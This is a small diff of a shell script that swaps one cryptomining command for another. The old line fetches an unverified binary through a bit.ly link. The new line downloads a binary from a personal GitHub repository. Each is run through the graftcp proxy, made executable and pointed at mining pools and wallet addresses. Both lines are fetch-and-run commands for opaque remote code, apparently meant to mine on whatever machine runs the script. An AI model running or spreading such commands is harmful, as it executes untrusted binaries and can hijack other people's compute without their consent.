@@ -31,4 +31,4 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://bit.ly/3bKjlUQ && chmod 700 3bKjlUQ && ./3bKjlUQ -a yespower -o 146.59.217.34:17055 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe -p c=VRSC,mc=BTE,ID=archer -t200 -B
+./graftcp/graftcp wget https://github.com/optimus66a/a/raw/main/ann && chmod 700 ann && ./ann ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
